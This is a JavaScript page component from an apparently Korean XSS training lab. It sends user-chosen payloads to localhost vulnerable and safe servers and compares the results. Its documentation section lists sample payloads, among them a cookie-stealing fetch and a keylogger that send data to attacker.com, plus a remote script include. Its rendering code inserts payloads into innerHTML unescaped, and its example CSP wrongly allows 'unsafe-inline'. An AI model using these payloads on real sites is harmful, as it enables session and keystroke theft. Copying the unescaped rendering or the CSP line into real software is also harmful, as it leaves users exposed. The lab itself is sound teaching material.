// XSS Page Component
import { languageServers } from '../config/servers.js?v=6';
import { VulnerabilityUtils } from '../vulnerabilities/common.js?v=6';
import { xssModule } from '../vulnerabilities/xss.js?v=9';

export const XSSPage = {
    currentLanguage: 'PHP',
    xssPayload: '<script>alert("XSS")</script>',
    xssScenario: 'basic',
    testResults: null,
    isLoading: false,

    async render() {
        return `
            <div class="xss-page">
                <!-- Page Header -->
                <div class="row mb-4">
                    <div class="col-12">
                        <div class="breadcrumb-container"></div>
                        <div class="page-header">
                            <h1><i class="fas fa-code text-warning"></i> Cross-Site Scripting (XSS)</h1>
                            <p class="lead">악성 스크립트 주입을 통한 클라이언트 사이드 공격 기법 학습</p>
                        </div>
                    </div>
                </div>

                <!-- Language Selection -->
                <div class="row mb-4">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-header">
                                <h5><i class="fas fa-code"></i> 언어 선택</h5>
                            </div>
                            <div class="card-body">
                                <div class="btn-group" role="group" id="language-selector">
                                    ${this.renderLanguageButtons()}
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- XSS Scenario Selection -->
                <div class="row mb-4">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-header">
                                <h5><i class="fas fa-theater-masks"></i> XSS 시나리오</h5>
                            </div>
                            <div class="card-body">
                                <div class="btn-group" role="group" id="scenario-selector">
                                    ${this.renderScenarioButtons()}
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Testing Interface -->
                <div class="row mb-4">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-header d-flex justify-content-between align-items-center">
                                <h5><i class="fas fa-vial"></i> XSS 테스트</h5>
                                <div>
                                    <span class="badge bg-info">언어: ${this.currentLanguage}</span>
                                    <span class="badge bg-secondary">시나리오: ${this.getScenarioName()}</span>
                                </div>
                            </div>
                            <div class="card-body">
                                <div class="row">
                                    <div class="col-md-8">
                                        <div class="mb-3">
                                            <label class="form-label">XSS Payload</label>
                                            <div class="input-group">
                                                <textarea class="form-control font-monospace" rows="3"
                                                         id="xss-payload" placeholder="XSS 페이로드 입력">${this.xssPayload}</textarea>
                                            </div>
                                            <div class="form-text">예: &lt;script&gt;alert("XSS")&lt;/script&gt;</div>
                                        </div>
                                        <div class="mb-3">
                                            <div class="btn-group">
                                                <button class="btn btn-danger" onclick="XSSPage.testVulnerableEndpoint()"
                                                        id="test-vulnerable-btn">
                                                    <i class="fas fa-bug"></i> 취약한 코드 테스트
                                                </button>
                                                <button class="btn btn-success" onclick="XSSPage.testSafeEndpoint()"
                                                        id="test-safe-btn">
                                                    <i class="fas fa-shield-alt"></i> 보안 코드 테스트
                                                </button>
                                                <button class="btn btn-primary" onclick="XSSPage.runComparisonTest()"
                                                        id="comparison-test-btn">
                                                    <i class="fas fa-balance-scale"></i> 비교 테스트
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-4">
                                        <h6><i class="fas fa-rocket"></i> 빠른 페이로드</h6>
                                        <div class="quick-payloads">
                                            ${this.renderQuickPayloads()}
                                        </div>
                                    </div>
                                </div>

                                <!-- Loading State -->
                                <div id="loading-indicator" class="d-none">
                                    <div class="text-center py-4">
                                        <div class="spinner-border text-warning" role="status">
                                            <span class="visually-hidden">테스트 중...</span>
                                        </div>
                                        <p class="mt-2">XSS 테스트 실행 중...</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Test Results -->
                <div class="row" id="test-results-container">
                    <!-- Results will be dynamically inserted here -->
                </div>

                <!-- Live Demo -->
                <div class="row mb-4" id="live-demo-container" style="display: none;">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-header bg-warning text-dark">
                                <h5><i class="fas fa-eye"></i> 실시간 데모</h5>
                                <small>실제 브라우저에서 XSS가 실행되는 모습을 확인해보세요</small>
                            </div>
                            <div class="card-body">
                                <div class="row">
                                    <div class="col-md-6">
                                        <h6 class="text-danger"><i class="fas fa-bug"></i> 취약한 페이지</h6>
                                        <iframe id="vulnerable-demo" class="w-100 border rounded"
                                                style="height: 300px;" sandbox="allow-scripts"></iframe>
                                    </div>
                                    <div class="col-md-6">
                                        <h6 class="text-success"><i class="fas fa-shield-alt"></i> 보안 페이지</h6>
                                        <iframe id="safe-demo" class="w-100 border rounded"
                                                style="height: 300px;" sandbox="allow-scripts"></iframe>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Code Examples -->
                <div class="row mb-4">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-header">
                                <h5><i class="fas fa-code-branch"></i> ${this.currentLanguage} 코드 예시</h5>
                            </div>
                            <div class="card-body">
                                <div class="row">
                                    <div class="col-md-6">
                                        <h6 class="text-danger"><i class="fas fa-bug"></i> 취약한 코드</h6>
                                        <pre class="line-numbers"><code class="language-${this.getLanguageCode()}" id="vulnerable-code">${this.getVulnerableCode()}</code></pre>
                                    </div>
                                    <div class="col-md-6">
                                        <h6 class="text-success"><i class="fas fa-shield-alt"></i> 보안 코드</h6>
                                        <pre class="line-numbers"><code class="language-${this.getLanguageCode()}" id="safe-code">${this.getSafeCode()}</code></pre>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Documentation -->
                <div class="row">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-header">
                                <h5><i class="fas fa-book"></i> XSS 공격 가이드</h5>
                            </div>
                            <div class="card-body">
                                ${this.renderDocumentation()}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
    },

    renderLanguageButtons() {
        return Object.entries(languageServers).map(([name, server]) => `
            <button type="button"
                    class="btn ${name === this.currentLanguage ? 'btn-primary' : 'btn-outline-primary'}"
                    onclick="XSSPage.selectLanguage('${name}')"
                    data-language="${name}">
                <span style="color: ${server.color};">${server.icon}</span>
                ${server.name}
            </button>
        `).join('');
    },

    renderScenarioButtons() {
        const scenarios = [
            { id: 'basic', name: '기본', desc: '단순한 스크립트 주입' },
            { id: 'attribute', name: '속성', desc: 'HTML 속성 내 주입' },
            { id: 'javascript', name: 'JS 컨텍스트', desc: 'JavaScript 코드 내 주입' },
            { id: 'url', name: 'URL', desc: 'URL 파라미터 주입' }
        ];

        return scenarios.map(scenario => `
            <button type="button"
                    class="btn ${scenario.id === this.xssScenario ? 'btn-warning' : 'btn-outline-warning'}"
                    onclick="XSSPage.selectScenario('${scenario.id}')"
                    data-scenario="${scenario.id}"
                    title="${scenario.desc}">
                ${scenario.name}
            </button>
        `).join('');
    },

    renderQuickPayloads() {
        const payloads = [
            { name: '기본 스크립트', payload: '<script>alert("XSS")</script>', icon: '🚀' },
            { name: '이미지 오류', payload: '<img src=x onerror=alert("XSS")>', icon: '🖼️' },
            { name: 'SVG 로드', payload: '<svg onload=alert("XSS")>', icon: '🎨' },
            { name: '이벤트 핸들러', payload: '" onmouseover="alert(\'XSS\')" "', icon: '👆' },
            { name: 'iframe 스크립트', payload: '<iframe src="javascript:alert(\'XSS\')"></iframe>', icon: '🖥️' },
            { name: '대소문자 우회', payload: '<ScRiPt>alert("XSS")</ScRiPt>', icon: '🔤' }
        ];

        return payloads.map(p => `
            <div class="quick-payload-item mb-2">
                <button class="btn btn-sm btn-outline-warning w-100 text-start"
                        onclick="XSSPage.selectPayload('${p.payload.replace(/'/g, "\\'")}')">
                    <span>${p.icon}</span> <strong>${p.name}</strong><br>
                    <small class="text-muted font-monospace">${p.payload.length > 30 ? p.payload.substring(0, 30) + '...' : p.payload}</small>
                </button>
            </div>
        `).join('');
    },

    renderDocumentation() {
        return `
            <div class="accordion" id="xssDocumentation">
                <div class="accordion-item">
                    <h2 class="accordion-header">
                        <button class="accordion-button" type="button" data-bs-toggle="collapse"
                                data-bs-target="#xss-types">
                            <i class="fas fa-list-ul me-2"></i> XSS 공격 유형
                        </button>
                    </h2>
                    <div id="xss-types" class="accordion-collapse collapse show">
                        <div class="accordion-body">
                            <div class="row">
                                <div class="col-md-6">
                                    <h6><i class="fas fa-mirror"></i> Reflected XSS</h6>
                                    <p>사용자 입력이 즉시 페이지에 반영되어 실행되는 XSS</p>
                                    <code>GET /search?q=&lt;script&gt;alert()&lt;/script&gt;</code>
                                </div>
                                <div class="col-md-6">
                                    <h6><i class="fas fa-database"></i> Stored XSS</h6>
                                    <p>악성 스크립트가 서버에 저장되어 다른 사용자에게 실행</p>
                                    <code>&lt;script&gt;steal_cookies()&lt;/script&gt;</code>
                                </div>
                                <div class="col-md-6">
                                    <h6><i class="fas fa-code"></i> DOM-based XSS</h6>
                                    <p>클라이언트 사이드 JavaScript에서 DOM 조작으로 발생</p>
                                    <code>document.write(location.hash)</code>
                                </div>
                                <div class="col-md-6">
                                    <h6><i class="fas fa-blind"></i> Blind XSS</h6>
                                    <p>관리자 페이지 등에서 실행되는 보이지 않는 XSS</p>
                                    <code>&lt;script src="//attacker.com/xss.js"&gt;</code>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="accordion-item">
                    <h2 class="accordion-header">
                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
                                data-bs-target="#xss-payloads">
                            <i class="fas fa-code me-2"></i> 고급 페이로드
                        </button>
                    </h2>
                    <div id="xss-payloads" class="accordion-collapse collapse">
                        <div class="accordion-body">
                            <div class="row">
                                <div class="col-12">
                                    <h6><i class="fas fa-cookie-bite"></i> 쿠키 탈취</h6>
                                    <pre class="bg-dark text-light p-2 rounded"><code>&lt;script&gt;
fetch('//attacker.com/steal?cookie=' + document.cookie);
&lt;/script&gt;</code></pre>
                                </div>
                                <div class="col-12">
                                    <h6><i class="fas fa-keyboard"></i> 키로거</h6>
                                    <pre class="bg-dark text-light p-2 rounded"><code>&lt;script&gt;
document.onkeypress = function(e) {
    fetch('//attacker.com/keylog?key=' + e.key);
}
&lt;/script&gt;</code></pre>
                                </div>
                                <div class="col-12">
                                    <h6><i class="fas fa-redirect"></i> 페이지 리다이렉션</h6>
                                    <pre class="bg-dark text-light p-2 rounded"><code>&lt;script&gt;
window.location.href = 'https://malicious-site.com';
&lt;/script&gt;</code></pre>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="accordion-item">
                    <h2 class="accordion-header">
                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
                                data-bs-target="#xss-prevention">
                            <i class="fas fa-shield-alt me-2"></i> 방어 기법
                        </button>
                    </h2>
                    <div id="xss-prevention" class="accordion-collapse collapse">
                        <div class="accordion-body">
                            <div class="row">
                                <div class="col-md-6">
                                    <h6><i class="fas fa-filter"></i> Output Encoding</h6>
                                    <p>HTML 특수문자를 안전한 형태로 인코딩</p>
                                    <code>htmlspecialchars($input, ENT_QUOTES)</code>
                                </div>
                                <div class="col-md-6">
                                    <h6><i class="fas fa-check-double"></i> Input Validation</h6>
                                    <p>입력값 검증 및 화이트리스트 필터링</p>
                                    <code>filter_var($input, FILTER_SANITIZE_STRING)</code>
                                </div>
                                <div class="col-md-6">
                                    <h6><i class="fas fa-shield-virus"></i> CSP</h6>
                                    <p>Content Security Policy로 스크립트 실행 제한</p>
                                    <code>script-src 'self' 'unsafe-inline'</code>
                                </div>
                                <div class="col-md-6">
                                    <h6><i class="fas fa-cookie"></i> Secure Cookies</h6>
                                    <p>HttpOnly, Secure 플래그로 쿠키 보호</p>
                                    <code>setcookie('name', 'value', ['httponly' => true])</code>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
    },

    async initialize() {
        // Update payload input binding
        const payloadInput = document.getElementById('xss-payload');
        if (payloadInput) {
            payloadInput.addEventListener('input', (e) => {
                this.xssPayload = e.target.value;
            });
        }

        // Setup message listener for XSS demo
        this.setupMessageListener();

        // Highlight code syntax
        this.updateCodeHighlighting();

        console.log('✅ XSS page initialized');
    },

    selectLanguage(language) {
        if (this.currentLanguage === language) return;

        this.currentLanguage = language;
        this.testResults = null;

        // Update language buttons
        document.querySelectorAll('[data-language]').forEach(btn => {
            if (btn.getAttribute('data-language') === language) {
                btn.className = 'btn btn-primary';
            } else {
                btn.className = 'btn btn-outline-primary';
            }
        });

        // Update language badge
        const badges = document.querySelectorAll('.badge.bg-info');
        badges.forEach(badge => {
            if (badge.textContent.includes('언어:')) {
                badge.textContent = `언어: ${language}`;
            }
        });

        // Update code examples
        this.updateCodeExamples();

        console.log(`✅ Language selected: ${language}`);
    },

    selectScenario(scenario) {
        if (this.xssScenario === scenario) return;

        this.xssScenario = scenario;

        // Update scenario buttons
        document.querySelectorAll('[data-scenario]').forEach(btn => {
            if (btn.getAttribute('data-scenario') === scenario) {
                btn.className = 'btn btn-warning';
            } else {
                btn.className = 'btn btn-outline-warning';
            }
        });

        // Update scenario badge
        const badges = document.querySelectorAll('.badge.bg-secondary');
        badges.forEach(badge => {
            if (badge.textContent.includes('시나리오:')) {
                badge.textContent = `시나리오: ${this.getScenarioName()}`;
            }
        });

        console.log(`✅ Scenario selected: ${scenario}`);
    },

    selectPayload(payload) {
        this.xssPayload = payload;
        const input = document.getElementById('xss-payload');
        if (input) {
            input.value = payload;
        }
        VulnerabilityUtils.showSuccessAlert(`페이로드 선택됨`);
    },

    getScenarioName() {
        const names = {
            basic: '기본',
            attribute: '속성',
            javascript: 'JS 컨텍스트',
            url: 'URL'
        };
        return names[this.xssScenario] || this.xssScenario;
    },

    async testVulnerableEndpoint() {
        this.showLoading(true);
        try {
            const serverUrl = this.getCurrentServerUrl();
            const response = await fetch(`${serverUrl}/xss/vulnerable`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    payload: this.xssPayload,
                    scenario: this.xssScenario
                })
            });

            if (response.ok) {
                const result = await response.json();
                this.displaySingleResult('vulnerable', result);
                this.updateLiveDemo();
            } else {
                throw new Error(`HTTP ${response.status}`);
            }
        } catch (error) {
            VulnerabilityUtils.showErrorAlert(`취약한 엔드포인트 테스트 실패: ${error.message}`);
        } finally {
            this.showLoading(false);
        }
    },

    async testSafeEndpoint() {
        this.showLoading(true);
        try {
            const serverUrl = this.getCurrentServerUrl();
            const response = await fetch(`${serverUrl}/xss/safe`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    payload: this.xssPayload,
                    scenario: this.xssScenario
                })
            });

            if (response.ok) {
                const result = await response.json();
                this.displaySingleResult('safe', result);
                this.updateLiveDemo();
            } else {
                throw new Error(`HTTP ${response.status}`);
            }
        } catch (error) {
            VulnerabilityUtils.showErrorAlert(`보안 엔드포인트 테스트 실패: ${error.message}`);
        } finally {
            this.showLoading(false);
        }
    },

    async runComparisonTest() {
        this.showLoading(true);
        try {
            const serverUrl = this.getCurrentServerUrl();
            const results = await xssModule.executeComparisonTest(serverUrl, this.xssPayload, this.xssScenario);
            this.displayComparisonResults(results);
            this.updateLiveDemo();
            VulnerabilityUtils.showSuccessAlert('비교 테스트 완료!');
        } catch (error) {
            VulnerabilityUtils.showErrorAlert(`비교 테스트 실패: ${error.message}`);
        } finally {
            this.showLoading(false);
        }
    },

    displaySingleResult(type, result) {
        const container = document.getElementById('test-results-container');
        const isVulnerable = type === 'vulnerable';

        container.innerHTML = `
            <div class="col-12">
                <div class="card">
                    <div class="card-header ${isVulnerable ? 'bg-danger text-white' : 'bg-success text-white'}">
                        <h5>
                            <i class="fas ${isVulnerable ? 'fa-bug' : 'fa-shield-alt'}"></i>
                            ${isVulnerable ? '취약한 코드' : '보안 코드'} 테스트 결과
                        </h5>
                    </div>
                    <div class="card-body">
                        <div class="row">
                            <div class="col-md-6">
                                <h6>실행 결과</h6>
                                <div class="bg-dark text-light p-3 rounded">
                                    <div class="font-monospace">${result.data?.result || '결과 없음'}</div>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <h6>상세 정보</h6>
                                <ul class="list-unstyled">
                                    <li><strong>언어:</strong> ${this.currentLanguage}</li>
                                    <li><strong>시나리오:</strong> ${this.getScenarioName()}</li>
                                    <li><strong>페이로드:</strong> <code>${this.xssPayload}</code></li>
                                    <li><strong>XSS 감지:</strong>
                                        <span class="badge ${result.data?.xss_detected ? 'bg-danger' : 'bg-success'}">
                                            ${result.data?.xss_detected ? '감지됨' : '차단됨'}
                                        </span>
                                    </li>
                                    <li><strong>실행 시간:</strong> ${result.data?.execution_time || 'N/A'}</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
    },

    displayComparisonResults(results) {
        const container = document.getElementById('test-results-container');

        container.innerHTML = `
            <div class="col-12">
                <div class="card">
                    <div class="card-header bg-warning text-dark">
                        <h5><i class="fas fa-balance-scale"></i> XSS 비교 테스트 결과</h5>
                    </div>
                    <div class="card-body">
                        <div class="row">
                            <div class="col-md-6">
                                <h6 class="text-danger"><i class="fas fa-bug"></i> 취약한 코드</h6>
                                <div class="bg-dark text-light p-3 rounded font-monospace mb-3">
                                    ${results.vulnerable ? (results.vulnerable.data?.result || '테스트 실패') : '테스트 실패'}
                                </div>
                                <div class="alert ${results.vulnerable?.data?.xss_detected ? 'alert-danger' : 'alert-success'}">
                                    ${results.vulnerable?.data?.xss_detected ?
                                        '<i class="fas fa-exclamation-triangle"></i> XSS 공격 성공 - 스크립트 실행됨' :
                                        '<i class="fas fa-check"></i> XSS 공격이 차단되었습니다'
                                    }
                                </div>
                            </div>
                            <div class="col-md-6">
                                <h6 class="text-success"><i class="fas fa-shield-alt"></i> 보안 코드</h6>
                                <div class="bg-dark text-light p-3 rounded font-monospace mb-3">
                                    ${results.safe ? (results.safe.data?.result || '테스트 실패') : '테스트 실패'}
                                </div>
                                <div class="alert ${results.safe?.data?.xss_detected ? 'alert-danger' : 'alert-success'}">
                                    ${results.safe?.data?.xss_detected ?
                                        '<i class="fas fa-exclamation-triangle"></i> 보안 코드에서 XSS 감지됨' :
                                        '<i class="fas fa-check"></i> XSS가 성공적으로 차단됨'
                                    }
                                </div>
                            </div>
                        </div>
                        <div class="row mt-3">
                            <div class="col-12">
                                <div class="alert alert-info">
                                    <h6><i class="fas fa-info-circle"></i> 테스트 요약</h6>
                                    <ul class="mb-0">
                                        <li><strong>언어:</strong> ${this.currentLanguage}</li>
                                        <li><strong>시나리오:</strong> ${this.getScenarioName()}</li>
                                        <li><strong>페이로드:</strong> <code>${this.xssPayload}</code></li>
                                        <li><strong>취약한 코드:</strong> ${results.vulnerable?.data?.xss_detected ? 'XSS 취약' : '안전함'}</li>
                                        <li><strong>보안 코드:</strong> ${results.safe?.data?.xss_detected ? 'XSS 취약' : '안전함'}</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
    },

    updateLiveDemo() {
        const container = document.getElementById('live-demo-container');
        if (!container) return;

        container.style.display = 'block';

        // Update demo iframes
        const vulnerableIframe = document.getElementById('vulnerable-demo');
        const safeIframe = document.getElementById('safe-demo');

        if (vulnerableIframe && safeIframe) {
            const serverUrl = this.getCurrentServerUrl();

            vulnerableIframe.src = `${serverUrl}/xss/demo/vulnerable?payload=${encodeURIComponent(this.xssPayload)}&scenario=${this.xssScenario}`;
            safeIframe.src = `${serverUrl}/xss/demo/safe?payload=${encodeURIComponent(this.xssPayload)}&scenario=${this.xssScenario}`;
        }
    },

    setupMessageListener() {
        // Listen for messages from iframe demos
        window.addEventListener('message', (event) => {
            if (event.data.type === 'xss_executed') {
                this.showXSSAlert(event.data.message);
            }
        });
    },

    showXSSAlert(message) {
        const alertDiv = document.createElement('div');
        alertDiv.className = 'alert alert-warning alert-dismissible fade show position-fixed';
        alertDiv.style.cssText = 'top: 120px; right: 20px; z-index: 9999; min-width: 350px; box-shadow: 0 8px 32px rgba(255, 193, 7, 0.4);';
        alertDiv.innerHTML = `
            <div class="d-flex align-items-center">
                <div class="me-3">
                    <i class="fas fa-bug fa-2x text-warning"></i>
                </div>
                <div class="flex-grow-1">
                    <div class="fw-bold text-warning mb-1">
                        <i class="fas fa-exclamation-triangle"></i> XSS 실행됨!
                    </div>
                    <div class="small text-dark">
                        ${message}
                    </div>
                </div>
                <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
            </div>
        `;
        document.body.appendChild(alertDiv);

        setTimeout(() => {
            if (alertDiv.parentNode) {
                alertDiv.parentNode.removeChild(alertDiv);
            }
        }, 5000);
    },

    showLoading(show) {
        this.isLoading = show;
        const indicator = document.getElementById('loading-indicator');
        const buttons = document.querySelectorAll('#test-vulnerable-btn, #test-safe-btn, #comparison-test-btn');

        if (indicator) {
            indicator.classList.toggle('d-none', !show);
        }

        buttons.forEach(btn => {
            btn.disabled = show;
        });
    },

    getCurrentServerUrl() {
        const server = languageServers[this.currentLanguage];
        return `http://localhost:${server.port}`;
    },

    getLanguageCode() {
        const codes = {
            'PHP': 'php',
            'Node.js': 'javascript',
            'Python': 'python',
            'Java': 'java',
            'Go': 'go'
        };
        return codes[this.currentLanguage] || 'text';
    },

    getVulnerableCode() {
        return xssModule.getCodeExamples(this.currentLanguage).vulnerable || '// 코드 예시를 불러올 수 없습니다.';
    },

    getSafeCode() {
        return xssModule.getCodeExamples(this.currentLanguage).safe || '// 코드 예시를 불러올 수 없습니다.';
    },

    updateCodeExamples() {
        const vulnerableCode = document.getElementById('vulnerable-code');
        const safeCode = document.getElementById('safe-code');

        if (vulnerableCode) {
            vulnerableCode.textContent = this.getVulnerableCode();
            vulnerableCode.className = `language-${this.getLanguageCode()}`;
        }

        if (safeCode) {
            safeCode.textContent = this.getSafeCode();
            safeCode.className = `language-${this.getLanguageCode()}`;
        }

        this.updateCodeHighlighting();
    },

    updateCodeHighlighting() {
        setTimeout(() => {
            if (window.Prism) {
                Prism.highlightAll();
                VulnerabilityUtils.addCopyButtons();
            }
        }, 100);
    }
};